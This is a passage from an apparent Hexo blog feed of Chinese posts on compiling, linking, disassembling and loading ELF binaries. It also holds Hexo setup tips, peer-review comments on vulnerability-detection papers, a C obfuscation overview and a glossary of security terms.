        <content type="html"><![CDATA[<h2 id="链接阶段">链接阶段</h2><blockquote><p>链接阶段是编译过程的最后阶段。顾名思义，<strong>此阶段将所有对象文件链接到一个二进制可执行文件中</strong>。在现代系统中，链接阶段有时会包含额外的优化过程，被称为链接时优化（Link-Time Optimization， LTO）。</p></blockquote><p>执行链接阶段的程序被称为链接器或者链接编辑器。通常链接器与编译器相互独立，编译器通常实现前面所有的步骤。</p><ul><li><p>对象文件是<mark>可重定位的，它们是相互独立编译的</mark>，这使得编译器无法假设对象最终会出现在任意特定的基址上。</p></li><li><p>对象文件可以<mark>引用其他对象文件或程序外部库中的函数或者变量</mark>。在链接阶段之前，引用代码和数据的地址尚不清楚，因此对象文件只包含重定位符号，<mark>这些符号指定最终如何解析函数和变量引用</mark>。在链接上下文中，<strong><mark>依赖于重定位符号的引用称为符号引用。</mark></strong></p></li><li><p>当一个对象文件通过绝对地址引用自己的函数或变量时，该引用也会被符号化。</p></li></ul><p>链接器的工作是获取属于程序的所有对象文件，并将它们合并为一个连贯的可执行文件，然后加载到特定的内存地址。既然现在已经知道可执行文件中所有模块的排列，链接器也就可以解析大多数的符号引用了。</p><p><strong>根据库文件的类型，对库文件的引用可能会、也可能不会完全解析。</strong></p><ul><li>静态库（在Linux操作系统上扩展名通常为.a）被合并到二进制可执行文件中，允许完全解析对静态库的任何引用。</li><li>动态 （共享）库，在系统上运行的所有程序的内存中共享。</li></ul><p>对于动态库，不是将库文件复制到使用它的每个二进制文件中，而是仅将动态库加载到内存中一次，并且任何想要使用该库的二进制文件都需要使用此共享副本。</p><p><em>在链接阶段，动态库将驻留的内存地址尚不清楚，因此无法解析对它们的引用。相反，即使在最终的可执行文件中，链接器也会对这些库文件留下符号引用，并且在将二进制文件实际加载到要执行的内存中之前，不会解析这些引用。</em></p><p><mark>大多数编译器（包括GCC）在编译过程结束时会自动调用链接器。因此，要生成完整的二进制可执行文件，只需在没有任何特殊开关的情况下调用GCC</mark>：</p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404260949861.png" alt="image-20240426094941831" style="zoom:67%;" /><p>默认情况下，可执行文件名为a.out，但你可以通过-o选项给GCC重写此命名，选项后跟输出文件的名称。</p><p>file实用程序现在告诉你正在处理的是一个ELF 64位LSB可执行文件❶，而不是在汇编阶段结束时看到的可重定位文件。此外还有一个重要信息是文件是动态链接的❷，这意味着它使用的某些库未合并到可执行文件中，而是在同一系统上运行的所有程序之间共享。最后，解释器/lib64/ld-linux-x86-64.so.2❸的文件输出会告诉你，当可执行文件加载到内存中执行时，哪个动态链接器将会被用来解析动态库的最终依赖关系。</p>]]></content>
      
      
      <categories>
          
          <category> 二进制分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 二进制分析 </tag>
            
            <tag> 二进制生命周期 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>6 反汇编二进制文件</title>
      <link href="/2023/12/18/Security/binary/lifecircle/6.%E5%8F%8D%E6%B1%87%E7%BC%96%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6/"/>
      <url>/2023/12/18/Security/binary/lifecircle/6.%E5%8F%8D%E6%B1%87%E7%BC%96%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<h2 id="反汇编二进制文件">反汇编二进制文件</h2><p>已经了解了如何编译二进制文件，那么让我们来看一下编译汇编阶段生成的对象文件内容。之后，我将会反汇编二进制可执行文 件，显示可执行文件内容与对象文件的内容有何不同。</p><h3 id="查看对象文件">查看对象文件</h3><p><strong><mark>使用objdump实用程序来展示如何进行反汇编</mark></strong>。objdump是一个简单、易用的反汇编程序，包含在大多数Linux发行版中，非常适合快速了解二进制文件中包含的代码和数据。</p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404260951330.png" alt="image-20220923091902054" style="zoom:80%;" /><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404260952278.png" alt="image-20220923091912707" style="zoom:80%;" /><p>此处，调用了objdump两次。</p><p>第一次，在 ❶处，调用objdump显示.rodata节的内容。.rodata节代表的是“只 读数据”，二进制文件中所有的常量都存储在该节，包括“Hello, world!”字符串。注意，.rodata节的内容是由 ASCII编码的字符串组成的，显示在左侧的输出中。在右侧，你可以看到相同字节的可读表示。</p><p>第二次在❷处调用objdump，以Intel语法反汇编对象文件的所有代码。正如你所看到的，结果仅包含main函数❸的代码，因为这是源文件中定义的唯一函数。大多数情况下，输出与先前由编译阶段生成的汇编 代码非常接近，它采用了一些汇编级宏。有趣的是，指向“Hello, world！”字符串的指针在❹处被置零。使用puts将字符串输出到屏幕的后续调用❺也指向无意义的位置，偏移19，在main函数的中间位置。</p><p>这是因为对象文件中的数据和代码引用尚未完全解析，因为编译器不知道最终文件加载的基址。这就是为什么在对象文件中尚无对puts调用的正确解析。对象文件正在等待链接器为此引用填充正确的值。可以通过readelf显示对象文件中存在的所有重定位符号来确认这一点，</p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404260951447.png" alt="image-20220923092710066" style="zoom:80%;" /><p>在❶处的重定位符号告诉链接器应该解析对字符串的引用，使其指向在.rodata节中结束的任意位置。相似地，在❷处的重定位符号告诉链接器应该解析对puts的引用。</p><h3 id="检查完整的二进制执行体">检查完整的二进制执行体</h3><p>从带有符号的二进制文件示例开始，然后再到已剥离的相同文件，看看反汇编后的输出差异。从objdump输出可以看到，反汇编的对象文件和二进制文件之间存在巨大差异。</p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404260951208.png" alt="image-20220923093802368" style="zoom:80%;" /><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404260951990.png" alt="image-20220923093827011" style="zoom:80%;" /><img src="mdPic/image-20220923093855513.png" alt="image-20220923093855513" style="zoom:80%;" /><p>可以看到二进制文件比对象文件有更多的代码。其中不再只是main函数，甚至不再只是单个代码节。二进制文件现在有多个节了， 如.init❶、.plt❷以及.text❸等。这些节均包含函数的代码，如程序初始化或者用于调用共享库的存根（stub）。</p><p><u>.text节是主要代码节，其中包含main函数❹，还包含许多其他函数，如_start，这些函数负责为main函数等设置命令行参数、运行时环境以及在main之后进行清理之类的任务</u>。这些函数被称为标准函数，存在于GCC生成的任何ELF二进制文件中。</p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404260951825.png" alt="image-20220923094940197" style="zoom:80%;" /><p>反汇编剥离的二进制文件尽管仍然可以清楚地区分不同的节（标记为❶、❷和❸），但所有函数都已合并成一大段代码。_start函数从❹处开始，而deregister_tm_clones函数从❻处开始。main函数从❼处开始，到❽处结束，但是在所有这些情况下，没有什么可以指示这些标记的指令代表函数的开始。唯一的例外是.plt节中的函数，它们的名称仍然和以前一样，如你在❺处对 _libc_start_main的调用中所看到的。</p>]]></content>
      
      
      <categories>
          
          <category> 二进制分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 二进制分析 </tag>
            
            <tag> 二进制生命周期 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>5 符号和剥离的二进制文件</title>
      <link href="/2023/12/18/Security/binary/lifecircle/5.%E7%AC%A6%E5%8F%B7%E5%92%8C%E5%89%A5%E7%A6%BB%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6/"/>
      <url>/2023/12/18/Security/binary/lifecircle/5.%E7%AC%A6%E5%8F%B7%E5%92%8C%E5%89%A5%E7%A6%BB%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<h2 id="符号和剥离的二进制文件">符号和剥离的二进制文件</h2><h3 id="符号信息">符号信息</h3><blockquote><p>高级源代码（如C代码）均以有意义的、人类可读的函数和变量命名为中心。编译程序时，编译器会翻译符号，这些符号会跟踪其名称，并记录哪些二进制代码和数据对应哪个符号。</p></blockquote><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404260950672.png" alt="image-20240426095025621" style="zoom: 67%;" /><p>用到了 readelf来显示符号❶。</p><p>请注意，在许多不熟悉的符号中，main函数❷有一个符号。你可以看到它指定了当二进制文件加载到内存时main将驻留的地址（0x400526）。输出还显示main的代码大小（32字节），并指出你正在处理一个函数符号（类型为 FUNC）。</p><p><strong>符号信息可以作为二进制文件的一部分，或者以单独的符号文件形式转译，它有各种风格</strong>。链接器只需要基本符号，但为了调试，可以转译出更广泛的信息。</p><p>调试符号提供了源 代码行和二进制指令之间的完整映射关系，甚至描述了函数的参数、堆栈帧信息等。<mark><strong>对于ELF二进制文件，调试符号通常以DWARF格式生成，而PE二进制文件通常使用专有的Microsoft可移植调试（如PDB）格式。DWARF信息通常嵌在二进制文件中，而PDB则以单独的符号文件的形式存在。</strong></mark></p><p>符号信息对于二进制分析非常有用。一组定义良好的函数符号可以使反汇编更加容易，这是因为可以将每个函数符号作为反汇编的起点。这样可以减少意外将<strong>数据反汇编为代码（这会导致在反汇编输出中出现伪指令）的可能性</strong>。知道二进制文件的哪些部分属于哪个函数以及调用了什么函数，使得逆向工程师更容易划分和理解代码在做什么。</p><p>可以使用readelf解析符号，也可以使用像libbfd这样的库以编程方式解析符号。还有诸如libdwarf之类的库，这些库是专门为解析DWARF调试符号而设计的.</p><h3 id="剥离二进制文件">剥离二进制文件</h3><p>GCC的默认行为是不自动剥离新编译的二进制文件。</p><p>如果你想知道带符号的二进制文件最终是如何被剥离的，可使用strip命令，</p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404260950027.png" alt="image-20220923090805952" style="zoom:80%;" /><p>示例二进制文件现在已被剥离❶，如file输出❷所确认的那样。在.dynsym符号表❸中只剩下少量符号。当二进制文件加载到内存中时，这些符号用于解决动态依赖关系，如对动态库的引用，但在反汇编时这些符号并没有太大的用处。所有其他的符号，包括主函数的符号都已经消失了。</p>]]></content>
      
      
      <categories>
          
          <category> 二进制分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 二进制分析 </tag>
            
            <tag> 二进制生命周期 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>7 加载并执行二进制文件</title>
      <link href="/2023/12/18/Security/binary/lifecircle/7.%E5%8A%A0%E8%BD%BD%E5%B9%B6%E6%89%A7%E8%A1%8C%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6/"/>
      <url>/2023/12/18/Security/binary/lifecircle/7.%E5%8A%A0%E8%BD%BD%E5%B9%B6%E6%89%A7%E8%A1%8C%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> 5  touch a.c</span><br><span class="line"> 6  gcc -E -P a.c</span><br><span class="line"> 7  gcc -S -masm=intel a.c</span><br><span class="line"> 8  cat a.s</span><br><span class="line"> 9  gcc -c a.c</span><br><span class="line">10  file a.o</span><br><span class="line">11  gcc a.c</span><br><span class="line">12  file a.out</span><br><span class="line">13  ls</span><br><span class="line">14  ./a.out</span><br><span class="line">15  readelf --syms a.out</span><br><span class="line">16  strip --strip-all a.out</span><br><span class="line">17  file a.out</span><br><span class="line">18  objdump -sj .rodata a.o</span><br><span class="line">19  objdump -M intel -d a.o</span><br><span class="line">20  readelf --relocs a.o</span><br><span class="line">21  ls</span><br><span class="line">22  objdump -M intel -d ./a.out.stripped</span><br></pre></td></tr></table></figure><h2 id="加载并执行二进制文件">加载并执行二进制文件</h2><blockquote><p>加载二进制文件是一个复杂的过程，涉及操作系统的大量工作。同样重要的是，内存中二进制文件的表示不一定与磁盘上二进制文件的表示一一对应。</p><p>图1-2显示了如何在Linux操作系统上 加载ELF二进制文件，如刚编译的二进制文件。从高层次上讲，这与在Windows操作系统上加载PE二进制文件非常相似。</p></blockquote><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404260952158.png" alt="image-20220923104102656" style="zoom:80%;" /><p>运行二进制文件时，</p><ul><li>操作系统首先要为运行的程序创建一个进程，其中包括虚拟地址空间。</li><li>随后，操作系统将解释器映射到进程的虚拟内存中。这是一个用户层程序，它知道如何加载二进制文件并执行必要的重定位。<mark><u>在Linux操作系统中，解释器通常是一个名为ldlinux.so的共享库。在Windows操作系统中，解释器的功能作为ntdll.dll的一部分实现</u>。</mark></li><li>加载解释器后，内核将控制权转移给它，然后解释器开始它在用户空间的工作。</li><li>解释器将二进制文件加载到其虚拟地址空间（与解释器相同的加载空间）中。</li><li>然后，解析并找出二进制文件所使用的动态库。解释器将它们映射到虚拟地址空间（使用mmap或同等函数），最后在二进制代码节中执行所有必要的重定位，以填充正确的地址引用动态库。实际上，通常会将动态库中对函数的引用的解析过程推迟。换句话说，解释器不是在加载时立即解析这些引用，而是仅在首次调用引用时才解析引用。这就是所谓的延迟绑定。</li><li>重定位完成后，解释器将会查找二进制文件的入口点并将控制权转移给入口点，从而开始正常执行二进制文件。</li></ul><p>Linux ELF二进制文件带有一个名为.interp的特殊节，该节指定用于加载二进制文件的解释器路径。</p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404260952152.png" alt="image-20220923104534576" style="zoom:80%;" />]]></content>
      
      
      <categories>
          
          <category> 二进制分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 二进制分析 </tag>
            
            <tag> 二进制生命周期 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2023/12/16/hello-world/"/>
      <url>/2023/12/16/hello-world/</url>
      
        <content type="html"><![CDATA[<p>这是一个指南</p><p><a href="https://gavinblog.github.io/anzhiyu-docs/">安知鱼主题指南 (gavinblog.github.io)</a></p><h3 id="布局layout">布局（Layout）</h3><p>Hexo 有三种默认布局：<code>post</code>、<code>page</code> 和 <code>draft</code>。在创建这三种不同类型的文件时，它们将会被保存到不同的路径；而您自定义的其他布局和 <code>post</code> 相同，都将储存到 <code>source/_posts</code> 文件夹。</p><table><thead><tr><th style="text-align:left">布局</th><th style="text-align:left">路径</th></tr></thead><tbody><tr><td style="text-align:left"><code>post</code></td><td style="text-align:left"><code>source/_posts</code></td></tr><tr><td style="text-align:left"><code>page</code></td><td style="text-align:left"><code>source</code></td></tr><tr><td style="text-align:left"><code>draft</code></td><td style="text-align:left"><code>source/_drafts</code></td></tr></tbody></table><h1 id="1-常用命令">1 常用命令</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">hexo init</span><br><span class="line">hexo clean</span><br><span class="line">hexo generate</span><br><span class="line">hexo server</span><br><span class="line">hexo d</span><br><span class="line"></span><br><span class="line">hexo new &quot;postName&quot; #新建文章</span><br><span class="line">hexo new page &quot;pageName&quot; #新建页面</span><br><span class="line">hexo generate #生成静态页面至public目录</span><br><span class="line">hexo server #开启预览访问端口（默认端口4000，&#x27;ctrl + c&#x27;关闭server）</span><br><span class="line">hexo deploy #部署到GitHub</span><br><span class="line">hexo help  # 查看帮助</span><br><span class="line">hexo version  #查看Hexo的版本</span><br><span class="line"></span><br><span class="line"># draft</span><br><span class="line">hexo new draft &quot;test&quot;</span><br><span class="line"></span><br><span class="line">hexo publish draft &quot;test&quot;</span><br></pre></td></tr></table></figure><h1 id="2-公式">2 公式</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">npm un hexo-renderer-marked --save</span><br><span class="line"># or</span><br><span class="line">npm un hexo-renderer-kramed --save</span><br><span class="line"># 安装 `hexo-renderer-markdown-it-plus`</span><br><span class="line">npm i @upupming/hexo-renderer-markdown-it-plus --save</span><br></pre></td></tr></table></figure><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在根目录的 _config.yml 中使用下面的配置将 strict 设置为 false</span></span><br><span class="line"><span class="attr">markdown_it_plus:</span></span><br><span class="line">  <span class="attr">plugins:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">plugin:</span></span><br><span class="line">      <span class="attr">name:</span> <span class="string">&#x27;@neilsustc/markdown-it-katex&#x27;</span></span><br><span class="line">      <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">      <span class="attr">options:</span></span><br><span class="line">        <span class="attr">strict:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 指南 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo bug</title>
      <link href="/2023/12/16/hello-bug/"/>
      <url>/2023/12/16/hello-bug/</url>
      
        <content type="html"><![CDATA[<p>这是一个bug指南，在使用Hexo的时候遇到了一些bug，自己在这里对解决过的bug做以记录。</p><h4 id="nunjucks-error-line-26-column-109-parseaggregate-expected-comma-after-expression">Nunjucks Error: [Line 26, Column 109] parseAggregate: expected comma after expression</h4><p>这个自己是hexo在render公式的时候产生的问题，不能两个”{“紧接着放在一起，应该{ {…} }在<strong>之间加空格</strong>。</p>]]></content>
      
      
      <categories>
          
          <category> 指南 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我的审稿意见</title>
      <link href="/2023/12/16/Manuscripts/review/"/>
      <url>/2023/12/16/Manuscripts/review/</url>
      
        <content type="html"><![CDATA[<h2 id="intelligent-vulnerability-detector-using-deep-sequence-and-graph-based-hybrid-feature-extraction">Intelligent Vulnerability Detector using deep sequence and graph based Hybrid Feature Extraction</h2><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202312191506692.png" alt="image-20231210113010116"></p><p>This manuscript proposed a graph-based and sequence-based neural network model for detecting vulnerabilities in Java code, utilizing multiple program features，which addresses the detection problem of a range of vulnerabilities collected from the Common Weakness Enumeration (CWE) . It introduces GCN-RFEMLP for extracting graph-based features and employs CodeBERT for extracting sequence-based features. However, there are some critical issues outlined in the manuscript making the referee has to reject it.</p><p>Comments：</p><ol><li>The COVID-19 pandemic, which is unrelated to the research and should not have been mentioned.</li><li>The manuscript presents a list of seven contributions; however, they lack conciseness and do not effectively emphasize the primary contributions.</li><li>Certain figures in the manuscript are not appropriate. Figure 1 appears to be more focused on the classification of machine learning methods and lacks contextual relevance, considering that the manuscript is specifically about vulnerability detection. Other figures also suffer from similar issues, as they seem to be detached from vulnerability detection and lack any meaningful connection. Figures 3 and 4 depict the node2vec process and GCN, respectively. However, these figures are not relevant to the vulnerability detection discussed in the paper and do not contribute to the study. Instead, the figures should focus on illustrating the transformation process from source code to code property graph, highlighting the comprehensive model proposed in the manuscript.</li><li>In the experimental section, the formatting of the tables presenting the experimental results lacks consistency. And, it is customary to report experimental results with two decimal places, such as 98.90. It is important to ensure that other result comparison data follow the same formatting convention.</li><li>The dataset description in the manuscript lacks clarity, and there is no mention of the labeling process for the data. Additionally, the comparison with other benchmarks does not indicate the dataset that was utilized.</li><li>Moreover, the manuscript lacks relevant explanations and approaches for addressing data imbalance, which can pose a risk of overfitting.</li></ol><h2 id="vuldet-bc-binary-software-vulnerability-detection-based-on-bigru-and-cnn">VulDet-BC: Binary Software Vulnerability Detection Based on BiGRU and CNN</h2><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202312191506699.png" alt="image-20231210113205646"></p><p>this manuscript 提出了一种二进制漏洞检测方法VulDet-BC，从二进制机器指令级别，结合BiGRU与CNN构建二进制漏洞检测模型，其中利用了注意力机制，并且通过与一些基线的对比在一些指标上优于基线，However, there are some critical issues outlined in the manuscript making the referee has to reject it.</p><p>Comments:</p><ol><li>文章在相关工作部分对漏洞检测这一研究领域的介绍不够充分，近期的许多新颖的工作并没有被提及。</li><li>深度学习方法常常基于一定的漏洞模式，来实现漏洞检测。文稿中的方法将二进制机器指令转换为数字形式，再转换过程中并没有提出任何与漏洞模式相关的概念，无论在语义或是语法上；</li><li>文中提到的BiGRU结合注意力模块并不新颖，且文中实验部分所提出的一系列RQ，缺乏对漏洞成因的思考，仅仅是从深度学习的角度在进行消融实验；</li><li>BinVulDet，在文稿中是第40个引用，是比较新的工作，在伪代码级别检测二进制软件的漏洞，文稿既没有对其工作进行介绍（related work)也没有与其进行对比研究。源代码漏洞检测方法VulDeePecker使用了code-gadget结合BiLSTM构建漏洞检测模型，但是文中似乎使用后半部分的BiLSTM进行对比，这样的对比实验设计已经不是同VulDeePecker工作进行对比了，这显然是错误的；</li><li>文稿中缺乏对漏洞检测任务的误报和漏报的分析，即FNR和FPR，这在漏洞检测的工作中非常重要，且缺乏对真实世界的软件漏洞进行检测的实验研究，使实验中提出的RQ变得更加单薄，对论文的研究缺乏支撑度；</li></ol><p>This manuscript proposed a binary software vulnerability detection method called VulDet-BC, which operates at the binary machine instruction level. It employs a combination of BiGRU and CNN along with attention mechanisms to build a vulnerability detection model. The manuscript claims superiority over baselines in certain metrics. However, the manuscript has several critical issues outlined below, which led the referee to reject it.</p><ol><li>The related work of the paper lacks a comprehensive review of the research field of vulnerability detection. Many recent and innovative works in the field have not been mentioned.</li></ol><p>2.Deep learning methods often rely on some vulnerability patterns to achieve effective vulnerability detection. The proposed method in the manuscript converts binary machine instructions into numeric representations without introducing any concepts related to vulnerability patterns, either semantically or syntactically.</p><p>3.The combination of BiGRU and attention mechanisms mentioned in the paper is not novel. Additionally, the series of research questions(RQ) proposed in the experimental section lacks contemplation on the causes of vulnerabilities. The experiments conducted only focus on the impact of deep learning techniques.</p><p>4.“BinVulDet” is referenced as the 40th citation in the manuscript and represents a relatively recent work that focuses on detecting vulnerabilities in binary software at the pseudo code level. However, the manuscript fails to provide an introduction to this work in the related work section and does not compare it with the proposed method. The source code vulnerability detection method “VulDeePecker” utilizes code-gadgets combined with BiLSTM to build a vulnerability detection model. However, it seems that the manuscript incorrectly compares its method with only the latter part, BiLSTM, which is not a valid comparison to the original VulDeePecker work. This discrepancy in the experimental design is evidently an error.</p><p>5.The manuscript lacks an analysis of false negatives (FNR) and false positives (FPR), which are crucial in vulnerability detection. Furthermore, there is a lack of experiments on detecting real-world software vulnerabilities, making the proposed research questions less substantiated.</p>]]></content>
      
      
      <categories>
          
          <category> Manuscripts </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 审稿 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>c语言混淆技术</title>
      <link href="/2023/12/16/Security/c%E8%AF%AD%E8%A8%80%E6%B7%B7%E6%B7%86%E6%8A%80%E6%9C%AF/"/>
      <url>/2023/12/16/Security/c%E8%AF%AD%E8%A8%80%E6%B7%B7%E6%B7%86%E6%8A%80%E6%9C%AF/</url>
      
        <content type="html"><![CDATA[<h4 id="代码混淆定义">代码混淆定义：</h4><p>原代码 P 通过某种变换变成代码 P’，若 P 和 P’运行结果与过程行为保持一致，该种变换就称之为混淆变换。</p><p>具体来说，当混淆转换满足以下两种情况时，这种混淆变化称之为合法的转换：</p><ul><li>（1）如果源程序 P 无法停止运行或报错结束运行，则变换后的程序 P’可以结束运行也可以继续运行。</li><li>（2）否则，目标程序 P’也结束运行并且输出与源程序相同的结果。</li><li><mark>两个程序之间操作并不一定完全相同，且不一定有相同的效率。</mark></li></ul><p>实际上，混淆工具预先设定若干混淆规则，并使用其它更为复杂的代码取代源代码中符合条件的代码语句，<strong>虽然源代码语义并未改变但混淆后的程序运行过程中空间复杂度往往更高，执行时间也更长，甚至有可能改变系统环境</strong>等。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/imgs202312171007669.png" alt="image-20231217100733637"></p><p>图 2.1 展示了混淆编译的整体流程，</p><ul><li>首先混淆工具会对输入的源代码进行代码预处理得到<mark>程序控制流图 CFG、抽象语法树 AST</mark> 等信息，</li><li>然后对<mark>数据流、控制流</mark>等进行分析，并根据输入的混淆参数选择对应的混淆算法处理源代码，</li><li>最后输出混淆编译后的程序。</li></ul><p>尽管混淆策略多种多样，但通常按 Collberg 提出的方法将其大致分为四类[16]：</p><ul><li>布局混淆</li><li>数据流混淆</li><li>控制流混淆</li><li>预防混淆</li></ul><p>接下来将对这几类混淆策略进行详细分析。</p><h4 id="布局混淆">布局混淆</h4><p>布局混淆是一种在不影响源程序正常运行的情况下，即<strong>不修改程序核心控制流和数据流</strong>，对程序包含有用信息的非核心代码做出修改的一种混淆策略；此处的非核心代码一般包括注释语句、多余代码片段、用于调试的代码语句以及自定义的变量名。</p>]]></content>
      
      
      <categories>
          
          <category> 软件安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C/C++ </tag>
            
            <tag> 软件安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Basic terms and concepts</title>
      <link href="/2023/12/16/Security/%E5%9F%BA%E6%9C%AC%E6%9C%AF%E8%AF%AD/"/>
      <url>/2023/12/16/Security/%E5%9F%BA%E6%9C%AC%E6%9C%AF%E8%AF%AD/</url>
      
        <content type="html"><![CDATA[<blockquote><p>Basic terms and concepts</p></blockquote><h2 id="vulnerability">Vulnerability</h2><h4 id="vulnerability-2">Vulnerability</h4><p><code>VUL</code>，Vulnerability的缩写，泛指<code>漏洞</code>。漏洞是指计算机系统中存在可能被攻击者利用的弱点、缺陷或安全漏洞。这些漏洞允许未经授权的访问，如窃取敏感数据，或允许攻击者在目标计算机系统上执行任意操作，如安装恶意软件。此类漏洞可能表现在不同方面，包括软件代码、硬件组件、配置或设计。</p><h4 id="cwe">CWE</h4><p>CWE是社区开发的漏洞列表。它提供了一种标准化和结构化的方法来识别和分类这些漏洞，并为每个漏洞分配一个唯一的标识符。例如，CWE-119提到了臭名昭著的“缓冲区溢出”。遵循不同级别的概念抽象，CWE将漏洞组织在树状层次结构中，其中低级CWE ID与高级CWE ID相关联。例如，表示“越界写入”的CWE-787和表示“越界读取”的CWE-125都是属于CWE-119的较低级别类型。</p><h4 id="poc"><strong>POC</strong></h4><p><code>POC，Proof of Concept</code>，中文意思是“<code>概念证明</code>”。这个短语会在漏洞报告中使用，漏洞报告中的POC则是<code>一段说明或者一个攻击的样</code>例，使得读者能够确认这个漏洞是真实存在的。</p><h4 id="exp"><strong>EXP</strong></h4><p><code>EXP</code>，Exploit，中文意思是“<code>漏洞利用</code>”。意思是一段对漏洞<code>如何利用的详细说明或者一个演示的漏洞攻击代码</code>，可以使得读者完全了解漏洞的机理以及利用的方法。</p><h4 id="cve漏洞编号"><strong>CVE漏洞编号</strong></h4><p><code>CVE</code> 的英文全称是“Common Vulnerabilities &amp; Exposures”公共漏洞和暴露，例如CVE-2015-0057、CVE-1999-0001等等。CVE就好像是一个字典表，为广泛认同的<a href="https://so.csdn.net/so/search?q=%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8&amp;spm=1001.2101.3001.7020">信息安全</a>漏洞或者已经暴露出来的弱点给出一个公共的名称。如果在一个漏洞报告中指明的一个漏洞，如果有CVE名称，你就可以快速地在任何其它CVE兼容的数据库中找到相应修补的信息，解决安全问题。</p><p>可以在https://cve.mitre.org/网站根据漏洞的CVE编号搜索该漏洞的介绍。</p><p>也可以在中文社区http://www.scap.org.cn/上搜索关于漏洞的介绍</p><h4 id="0day漏洞和0day攻击"><strong>0DAY漏洞和0DAY攻击</strong></h4><p>在计算机领域中，零日漏洞或零时差漏洞（英语：Zero-dayexploit）通常是指还没有补丁的安全漏洞，而零日攻击或零时差攻击（英语：Zero-dayattack）则是指利用这种漏洞进行的攻击。提供该漏洞细节或者利用程序的人通常是该漏洞的发现者。零日漏洞的利用程序对网络安全具有巨大威胁，因此零日漏洞不但是黑客的最爱，掌握多少零日漏洞也成为评价黑客技术水平的一个重要参数。<br>零日漏洞及其利用代码不仅对犯罪黑客而言，具有极高的利用价值，一些国家间谍和网军部队，例如美国国家安全局和美国网战司令部也非常重视这些信息。据路透社报告称美国政府是零日漏洞黑市的最大买家。</p><h4 id="can">CAN</h4><p>CAN和CVE的唯一区别是前者代表了候选条目，还未经CVE编辑委员会认可，而后者则是经过认可的条目。 然后，两种类型的条目都对公众可见，条目的编号不会随着认可而改变—仅仅是“CAN”前缀替换成了“CVE”。</p><h4 id="bugtraq">BUGTRAQ</h4><p>一个完整的对计算机安全漏洞（它们是什么，如何利用它们，以及如何修补它们）的公告及详细论述进行适度披露的邮件列表</p><h4 id="cncve">CNCVE</h4><p>中国（CN）的 CVE ，是CNCERT/CC（国家计算机网络应急处理协调中心）为漏洞进行编号的一个自己的标准。CNCVE不但包含漏洞的描述予以统一定义，还将包括漏洞的补丁、验证等措施，更方便、有用。</p><h4 